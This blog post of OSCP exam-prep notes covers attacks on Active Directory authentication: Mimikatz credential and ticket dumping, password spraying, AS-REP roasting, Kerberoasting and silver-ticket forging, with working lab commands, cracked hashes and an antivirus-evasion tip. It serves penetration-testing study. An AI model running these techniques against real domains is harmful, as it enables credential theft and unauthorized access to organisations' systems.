---
title: Attacking Active Directory Authentication
date: 2024-04-15 12:37:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Attacking Active Directory Authentication tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Attacking Active Directory Authentication

## Understanding Active Directory Authentication

### NTLM Authentication

NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.

There are seven steps in NTLM authentication.

![image](https://github.com/ryennewhite/ryennewhite.github.io/assets/112822039/1335acc0-fee5-40bf-aef4-ce96f87dd531)

### Kerberos Authentication

Kerberos has been used as Microsoft's primary authentication mechanism since Windows Server 2003. While NTLM authentication works via a challenge-and-response paradigm, Windows-based Kerberos authentication uses a ticket system.

A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application server itself. On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

![image](https://github.com/ryennewhite/ryennewhite.github.io/assets/112822039/0187d6a5-c558-4318-8c6b-0d5d0619340f)

### Cached AD Credentials

Since 

Microsoft's implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In modern versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS)1 memory space.

Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target. 

NOTE: In the following example, we will run Mimikatz as a standalone application. However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the Antivirus Evasion Module instead. For example, execute Mimikatz directly from memory using an [injector like PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1), or use a built-in tool like [Task Manager to dump the entire LSASS process memory](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/), [move the dumped data to a helper machine, and then load the data into Mimikatz](http://www.fuzzysecurity.com/tutorials/18.html).

We'll use the jeff account we have the password for.

```console
kali$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.154.75

// start PS as Administrator

PS> cd C:\Tools

PS> .\mimikatz.exe

PS> privilege::debug

// dump creds of all logged on users

PS> sekurlsa::logonpasswords
* Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f
* Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd
```

Use these hashes with the Password Attacks section attacks.

A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets.

```console
// list contents of smb share on WEB04 - this creates and caches a service ticket!

PS> dir \\web04.corp.com\backup

// NOW use mimikatz again

PS> sekurlsa::tickets
Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. Alternatively, armed with a TGT, we could request a TGS for specific resources we want to target within the domain.
If a server is installed as a Certification Authority (CA),14 it can issue and revoke digital certificates. We could issue certificates for web servers to use HTTPS or to authenticate users based on certificates from the CA via Smart Cards.15

These certificates may be marked as having a non-exportable private key16 for security reasons. If so, a private key associated with a certificate cannot be exported even with administrative privileges. However, there are various methods to export the certificate with the private key.

We can rely again on Mimikatz to accomplish this. The crypto17 module contains the capability to either patch the CryptoAPI18 function with crypto::capi19 or KeyIso20 service with crypto::cng,21 making non-exportable keys exportable.

## Performing Attacks on Active Directory Authentication

### Password Attacks

We should be aware of account lockouts when brute forcing.

```console
// check the account [policy

PS> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

The lockout threshold in this case is 5. Then we have to wait 30 minutes for the lockout observation window. With these settings, we could attempt 192 logins in a 24-hour period against every domain user without triggering a lockout.

Let's try three other password spraying attacks that have higher chances of success.

The first kind of password spraying attack uses LDAP and ADSI to perform a low and slow password attack against AD users. Previously, we performed queries against the domain controller as a logged-in user with DirectoryEntry.2 However, we can also make queries in the context of a different user by setting the DirectoryEntry instance. We used the DirectoryEntry constructor without arguments, but we can provide three arguments, including the LDAP path to the domain controller, the username, and the password.

```console
PS> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
PS> $PDC = ($domainObj.PdcRoleOwner).Name
PS> $SearchString = "LDAP://"
PS> $SearchString += $PDC + "/"
PS> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
PS> $SearchString += $DistinguishedName
PS> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")

// if this password is correct, the object creation will be successful:
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com

// if the password is invalid, no object will be created and we will receive an exception
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

We could use this technique to create a PowerShell script that enumerates all users and performs authentications according to the Lockout threshold and Lockout observation window.

This password spraying tactic is already implemented in the PowerShell script C:\Tools\Spray-Passwords.ps1 on this client. The -Pass option allows us to set a single password to test, or we can submit a wordlist file using -File. We can also test admin accounts by adding the -Admin flag.

```console
PS> cd C:\Tools

PS> powershell -ep bypass

PS> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

The second kind of password spraying attack against AD users leverages SMB. comes with some drawbacks. This attack comes with drawbacks though, as for every authentication attempt, a full SMB connection has to be set up and then terminated. As a result, this kind of password attack is very noisy and slow.

We can use crackmapexec on Kali to do this.

```console
kali$ cat users.txt
dave
jen
pete

kali$ crackmapexec smb 192.168.249.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.249.75  445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.249.75  445    CLIENT75         [+] corp.com\jen:Nexus123! 
SMB         192.168.249.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
```

Note: crackmapexec doesn't examine the password policy of the domain before starting the password spraying. Be cautious about locking out user accounts with this method.

It does tell us who has admin privs on the target system, though, which we see when it appends (Pwn3d!) to the output.

```console
kali$ crackmapexec smb 192.168.249.75 -u dave -p 'Flowers1' -d corp.com
SMB         192.168.249.75  445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
```

Lastly, let's try password spraying by obtaining a TGT. Using kinit5 on a Linux system, we can obtain and cache a Kerberos TGT. We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT. We could use Bash scripting or a programming language of our choice to automate this method. Fortunately, we can also use the tool kerbrute, which can be used on Windows and Linux.

```console
PS> type .\usernames.txt
pete
dave
jen

PS> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
2024/04/16 12:44:19 >  Using KDC(s):
2024/04/16 12:44:19 >   dc1.corp.com:88
2024/04/16 12:44:19 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2024/04/16 12:44:19 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2024/04/16 12:44:19 >  Done! Tested 3 logins (2 successes) in 0.104 seconds
```

Note: If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.

### AS-REP Roasting

If the AS-REQ auth was successful, the DC replies with an AS-REP containing the session key and TGT. This is called Kerberos preauthentication, and it prevents offline password cracking.

The AD user account option "Do not require Kerberos preauthentication" is disabled by default. However, it is possible to enable this manually. 

Let's try the attack from Kali first.

```console
kali$ impacket-GetNPUsers -dc-ip 192.168.249.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.11.0 - Copyright 2023 Fortra

Password: // use pete's password we already found
Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2024-04-16 17:35:28.945619  0x410200

// dave has the user account option Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting

kali$ hashcat --help | grep -i "Kerberos"
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

kali$ sudo hashcat -m 18200 hashes.asreproast /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
$krb5asrep$23$dave@CORP.COM:5994867aa29e677533115b81be00b677$54d233b58433e0dfc213bffe51033bcd47b6b2628a80dbb06c043075d69f3a19fa3309facd9970813e478568cf99247331f89ed11596f096afc9210ffb5479c0f71be3783ad600cbc39d6e57e9d6a58a5085ebdfb58e903e909e7d268eb1da722d8934a72feaa1228a1364e6edd9e094d86a06cbb2779c1c115c81f59c15daf104e71241abe86f40add72c02a2e589300701fdeac37b462a078d8c60ebf025224b6c01484eea6c46e2df69ecde4717625362e6b9843db9fd517f71396ee26abc7b2aef6e84f6598ae790b45882d672715eca2b5729c8c5e94c910ab1a7fdea2d3b839ee3:Flowers1
```

Let's try AS-REP Roasting in Windows now using Rubeus.

```console
PS> cd C:\Tools

PS> .\Rubeus.exe asreproast /nowrap
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.249.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

// since we're performing this attack as a pre-authenticated domain user, we don't have to provide any other options
// Rubeus will automatically identify vulnerable user accounts
// Rubeus found that dave is vulnerable
// copy the hash and transfer it to kali

kali$ sudo hashcat -m 18200 hashes.asreproast2 /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
$krb5asrep$dave@corp.com:b1beefafd55aa9328fa16480397f7e0b$d1d0984009e012e3a40511e07a600b7480e9f6bd0f1d39eda5a0bd1ef42069f7f9c325136b51b6d91ed798a49e681fd19e571dfba6817a52bda76195f9f5c97c1397188288b60c63c1a6143e9fdb292db03bd92ae4c955eed03af20f7ebbd7417df63f7d7a89b20d924c4cf41da3eb25eff202b726a9153f70cd5f7ab706b76ffa9b1da6ec4c14dd861694ff74f81caa16213ab91975604868ed0f05b349403747b53d4fe4614aa943d10ae0848f1a4c630e1ae30046826118a6c85cb6ac85771da3b658a4e9c6d0435c3d9ffc4056d468d000fd2ba6fec22f6ac2f89938d91df94a63c6:Flowers1
```

To identify users with the enabled AD user account option Do not require Kerberos preauthentication, we can use PowerView's Get-DomainUser function with the option -PreauthNotRequired on Windows. On Kali, we can use impacket-GetNPUsers as shown in (impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete)  without the -request and -outputfile options.

If you happen to have GenericWrite or GenericAll on another AD user account, instead of changing their password, you can change the User Account Control value of the user to not require Kerberos preauthentication.

### Kerberoasting

In Kerberos, when requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.

These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.

If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as Kerberoasting.

```console
kali$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.208.75 /drive:shared,/tmp

PS> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast

// copy hashes.kerberoast to kali

$kali
cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$8684779CD6592BDDBCF00BE086C8ECD3$D0FDD66B013002C3700C2985C9411E1E67B23A0FF261E5134E9DACBE7E893AA90303A8D869C6F79D2100A66917C2193B2E708E750FC10710B115A04C6FE0CB394FF48D419A0C5B152100A3504386F63B59F6735A84AE115AA90F843C75C608EB489589A43B89ED9AE76F5FA4544EFCCFB9652D560C9C4BA3C1FC067EF7AD5F9566EA2DE3A8A4BF1CA3E8F6F2EF0DF816E66998AE8C9C2905A94B25817CA79B22C6C1022FCF5E7E0A01763301F4942298A13DD4AC5E2488768AC209D2F234C3E3010AAD6D34ADD4C89F763CBD7C1AC659E819EB477CAB2EDCF2726529B2C53865AB1FBDDCD412D6A1886B601287C60E4D6D700E2C1B99A37893A451C9B3E05184F42B737C0EBA3536BEAF8D58236C14E50F55C1FAE87D741365348EB18581B787A1640431E40354D7408CDC4858F9DC5602BE7F2F2BBFE05598F8263DF518D474BEA18D774F014B86C9EBD977301C8825A21B5551DC1EE8236EECB7253540317A5ECAFC609DCA84641FF58616197661A61388236832602BFC1D8F618FB7327D6EC20DF73143ED8BC4302A25A679FC85643EF79D694C3E2405152B74C44B50BAAA2E5B06ADC19780BF323249F2CC02909EA71073BBE61ACC83D24316419B1EAA8006A91634440A6C8953B97D69254469618DEB1DA6D7C192118D7C41D79143605E09E44DB0A7CBDD69ACD1C5B0DF657C98D80A06854B8B89CFB40CC409094FDDF6349633F31FD9101798BE984C90078A3D2BE0AD699DD1883E892BCCEBF23C043DF952AFE7517A05A44AE20EE8AABDFA72513EDBADDA07B20424C9781E3F2DB1DBFC03A51BC1726E80DA335D3F45B61556EDFB68DA203CB0872EBB9E25C0BEEB029404E946F482469089B078D0922DF1A9E3E4C44B573C5A51F028516DBAFD881ACA5B51B21284BF8D6D92FCE8436F0AC5953B4055B848C0F3D0A6ADE2073EC904E076760FDCE837E5E33C59C24F6E97E534C029A3DE06CCD1DD0579D477CD63FD8447C3C6532EC81589A277E1B0FED1748ED1E2725C99312DB04AE1633EF3EDF2855C593D6D2E1203D949BB5ABACD0DA85CBC73DD5A9434EFF40C3F80C43C7BF01064CA810DBA4CB74A59A00D3FAF3B7E650B02A4DAFBD150BCC77ECEC0181067B4992E9E6AE56E4B0C9A7939CFA97F30304B40B88E9934A77AA40AF85FC9ACED0E56E9A41EE4C4154DEB5F95BD7DFDCFB192EF77E332FE830621AFC3018BF4DDDDD10625D5FBB0DEA7DB278D681CBC51BBC042EF8AB242DBE53741EA7DDF9090041347A28293F4DB7A44CEBC4B67086A5988ADA63DAB55A69EA80409560166A77F8AF02021F9195EE22BCBA4B2A31E9DA705B65C5A1B994D12277DF36043425C71EB60000FD72879308A36D68555C46578E655B1D97F8A4EDE250C6797F40CE8ACD93C1067284B08FFD63D2CC8673D8E5A15DFF3030451D1126D69682A31D97B24D1D2F147F74C15F794D4F8668FCA552961424B3CCAF2

kali$ hashcat --help | grep -i "Kerberos"
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol

kali$ sudo hashcat -m 13100 hashes.kerberoast /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$8684779cd6592bddbcf00be086c8ecd3$d0fdd66b013002c3700c2985c9411e1e67b23a0ff261e5134e9dacbe7e893aa90303a8d869c6f79d2100a66917c2193b2e708e750fc10710b115a04c6fe0cb394ff48d419a0c5b152100a3504386f63b59f6735a84ae115aa90f843c75c608eb489589a43b89ed9ae76f5fa4544efccfb9652d560c9c4ba3c1fc067ef7ad5f9566ea2de3a8a4bf1ca3e8f6f2ef0df816e66998ae8c9c2905a94b25817ca79b22c6c1022fcf5e7e0a01763301f4942298a13dd4ac5e2488768ac209d2f234c3e3010aad6d34add4c89f763cbd7c1ac659e819eb477cab2edcf2726529b2c53865ab1fbddcd412d6a1886b601287c60e4d6d700e2c1b99a37893a451c9b3e05184f42b737c0eba3536beaf8d58236c14e50f55c1fae87d741365348eb18581b787a1640431e40354d7408cdc4858f9dc5602be7f2f2bbfe05598f8263df518d474bea18d774f014b86c9ebd977301c8825a21b5551dc1ee8236eecb7253540317a5ecafc609dca84641ff58616197661a61388236832602bfc1d8f618fb7327d6ec20df73143ed8bc4302a25a679fc85643ef79d694c3e2405152b74c44b50baaa2e5b06adc19780bf323249f2cc02909ea71073bbe61acc83d24316419b1eaa8006a91634440a6c8953b97d69254469618deb1da6d7c192118d7c41d79143605e09e44db0a7cbdd69acd1c5b0df657c98d80a06854b8b89cfb40cc409094fddf6349633f31fd9101798be984c90078a3d2be0ad699dd1883e892bccebf23c043df952afe7517a05a44ae20ee8aabdfa72513edbadda07b20424c9781e3f2db1dbfc03a51bc1726e80da335d3f45b61556edfb68da203cb0872ebb9e25c0beeb029404e946f482469089b078d0922df1a9e3e4c44b573c5a51f028516dbafd881aca5b51b21284bf8d6d92fce8436f0ac5953b4055b848c0f3d0a6ade2073ec904e076760fdce837e5e33c59c24f6e97e534c029a3de06ccd1dd0579d477cd63fd8447c3c6532ec81589a277e1b0fed1748ed1e2725c99312db04ae1633ef3edf2855c593d6d2e1203d949bb5abacd0da85cbc73dd5a9434eff40c3f80c43c7bf01064ca810dba4cb74a59a00d3faf3b7e650b02a4dafbd150bcc77ecec0181067b4992e9e6ae56e4b0c9a7939cfa97f30304b40b88e9934a77aa40af85fc9aced0e56e9a41ee4c4154deb5f95bd7dfdcfb192ef77e332fe830621afc3018bf4ddddd10625d5fbb0dea7db278d681cbc51bbc042ef8ab242dbe53741ea7ddf9090041347a28293f4db7a44cebc4b67086a5988ada63dab55a69ea80409560166a77f8af02021f9195ee22bcba4b2a31e9da705b65c5a1b994d12277df36043425c71eb60000fd72879308a36d68555c46578e655b1d97f8a4ede250c6797f40ce8acd93c1067284b08ffd63d2cc8673d8e5a15dff3030451d1126d69682a31d97b24d1d2f147f74c15f794d4f8668fca552961424b3ccaf2:Strawberry1

```

Now, let's try from Linux.

```console
kali$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.208.70 corp.com/pete
Password: // must use domain user creds (used pete's in this case)
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  --------  --------------------------  --------------------------  -------------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$88524b2156ae0a9aa7b2af67df98cc31$7cab55becc05a71b4d3b09339fd6814d7bfa1ff228429fc1f7e30a4b1421136d18e9316313a6f7c9640a4038e277e8e5caa28d414181763c550d3c46fdf45734da34169c9e35d59436f5cc57c6d8cb74913508bbb1a46f7bf538b27da330797333734c2c36e2bce1b7a2bdb5d897a8cf4487b9a5347eecf39fcd864d373c47762fadf174e03ac195718b2cc7ba0f031f7195fe2ba1a8ce922b55116ce703db5a9ba42e1ab438f0d2ad94614c516e72dda8aa5e8800acf3a7294440f76fed23b01c6050e1d45d6a4bdc540d063aec8eeac04df73b9194495868da526a513537f11b1472e77225b26f942a4032b7a09409bf731485b0e0cc50ddc0707723860b1f1228a35d0d08e087e809a60977823ecc122b838acb4002b68ed5f5a5218c83d3d57abb033eeb5f596bc303402313d095cb027849455105ae33207a76187a713f64957ea34ef6d9781b63d653250b08d4be17b9a39b64d437e1ddf88adb178588bfb117581151483aef937d37aaa49108dad09ca6bed99e687a8a004dd7b012c7db135a4c6ad19c91b4f943d348f5cec8af29b1d3475fbd24c0f16ec37bb3116409d35b018d772c2588d6c25e8bbab49d761c71e74e860c784eecf942a0284d2b889036c0553408d3c5d4b36309dd398232807d0e1ce6187bb8b48d955c693893ec5c6c7d27985cccd778861804033e20f7891b90c4fcb04eba46d8084adaa34ee05c771f99e869f0855538e15d0bfabc00f889f670405b3b47b72870f27e2a748f9f986aca44960175f31b030de8f6a948a043950e08e5fee154a21cc3af427e9e35983fbfe7a1693438515350e68136e2088cd852da02a1ee19fcc3a6a809cc2e0ef67f554b41c2b5d912d58a1c3d874e32d5d1bdd56f2fc77b51fd13f5afcbcacac2ee70968ed2e7d094129c7f4576b7f074f73489b1d5389f6b6b7954a4af76d0dc10119fc9f2bcac13fd0cd36d61c85e9b43025914269c0f25678bf24fe40390681eb3ab7f1aa769c213a7f0a5077f2ea1c8c0b97e36364c587794f4a72de5afc16d2ea08a0463ec9f7a6349ab2e50ba31b648dae95e3c3adb025ae485f507adf5cc1e0de61f5a091659e858f4ecdfb93df0d8af9b9c92e9c057c30c17954ab408acaf42aecc2aff55b0f11529ce85c25bec399c6f613a6f06b838d4dc7f1e90fd1bc85e2c2c426a9a5aec66a8b706f4951d9a45bac3fbae63f692168c38632a1202e87d83a1ef03f300d634f258629801f8aa4e84da867dce49bc58d850b102e06b0966496366434814a00cb4035d6bcb8864cdc7fce1af636bd465925f69f1432a8b67b6adcb46e501812afe0e8387c1a2be79d60f6477d3a91b

// copy hash to a file

$ sudo hashcat -m 13100 hashes.kerberoast2 /home/kali/Desktop/oscp/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$88524b2156ae0a9aa7b2af67df98cc31$7cab55becc05a71b4d3b09339fd6814d7bfa1ff228429fc1f7e30a4b1421136d18e9316313a6f7c9640a4038e277e8e5caa28d414181763c550d3c46fdf45734da34169c9e35d59436f5cc57c6d8cb74913508bbb1a46f7bf538b27da330797333734c2c36e2bce1b7a2bdb5d897a8cf4487b9a5347eecf39fcd864d373c47762fadf174e03ac195718b2cc7ba0f031f7195fe2ba1a8ce922b55116ce703db5a9ba42e1ab438f0d2ad94614c516e72dda8aa5e8800acf3a7294440f76fed23b01c6050e1d45d6a4bdc540d063aec8eeac04df73b9194495868da526a513537f11b1472e77225b26f942a4032b7a09409bf731485b0e0cc50ddc0707723860b1f1228a35d0d08e087e809a60977823ecc122b838acb4002b68ed5f5a5218c83d3d57abb033eeb5f596bc303402313d095cb027849455105ae33207a76187a713f64957ea34ef6d9781b63d653250b08d4be17b9a39b64d437e1ddf88adb178588bfb117581151483aef937d37aaa49108dad09ca6bed99e687a8a004dd7b012c7db135a4c6ad19c91b4f943d348f5cec8af29b1d3475fbd24c0f16ec37bb3116409d35b018d772c2588d6c25e8bbab49d761c71e74e860c784eecf942a0284d2b889036c0553408d3c5d4b36309dd398232807d0e1ce6187bb8b48d955c693893ec5c6c7d27985cccd778861804033e20f7891b90c4fcb04eba46d8084adaa34ee05c771f99e869f0855538e15d0bfabc00f889f670405b3b47b72870f27e2a748f9f986aca44960175f31b030de8f6a948a043950e08e5fee154a21cc3af427e9e35983fbfe7a1693438515350e68136e2088cd852da02a1ee19fcc3a6a809cc2e0ef67f554b41c2b5d912d58a1c3d874e32d5d1bdd56f2fc77b51fd13f5afcbcacac2ee70968ed2e7d094129c7f4576b7f074f73489b1d5389f6b6b7954a4af76d0dc10119fc9f2bcac13fd0cd36d61c85e9b43025914269c0f25678bf24fe40390681eb3ab7f1aa769c213a7f0a5077f2ea1c8c0b97e36364c587794f4a72de5afc16d2ea08a0463ec9f7a6349ab2e50ba31b648dae95e3c3adb025ae485f507adf5cc1e0de61f5a091659e858f4ecdfb93df0d8af9b9c92e9c057c30c17954ab408acaf42aecc2aff55b0f11529ce85c25bec399c6f613a6f06b838d4dc7f1e90fd1bc85e2c2c426a9a5aec66a8b706f4951d9a45bac3fbae63f692168c38632a1202e87d83a1ef03f300d634f258629801f8aa4e84da867dce49bc58d850b102e06b0966496366434814a00cb4035d6bcb8864cdc7fce1af636bd465925f69f1432a8b67b6adcb46e501812afe0e8387c1a2be79d60f6477d3a91b:Strawberry1
```

Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user, kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting.

### Silver Tickets

We'll go one step further and forge our own service tickets with any permissions we desire. If the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

In general, we need to collect the following three pieces of information to create a silver ticket:

- SPN password hash
- Domain SID
- Target SPN

```console
kali$ In general, we need to collect the following three pieces of information to create a silver ticket:

    SPN password hash
    Domain SID
    Target SPN

// confirm that our current user does not have access to the resource of the HTTP SPN mapped to iis_service.
PS> iwr -UseDefaultCredentials http://web04
iwr : Server Error
401 - Unauthorized: Access is denied due to invalid credentials.
You do not have permission to view this directory or page using the credentials that you supplied.
At line:1 char:1
+ iwr -UseDefaultCredentials http://web04
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

// since we are Local Admin on this machine where iis_service has an active session, mimikatz!

PS> .\mimikatz.exe

mimikatz# privilege::debug
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 4/22/2024 1:47:02 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         
// now get the domain SID - ONLY PART OF THE BELOW OUTPUT
// the domain SID in this case is S-1-5-21-1987370270-658905905-1781884369

> whoami /user
User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105

// lastly, get the target SPN
// we'll target the HTTP SPN resource on WEB04 (HTTP/web04.corp.com:80) because we want to access the web page running on IIS

// now, build the cmd to get a silver ticket

mimikatz# kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
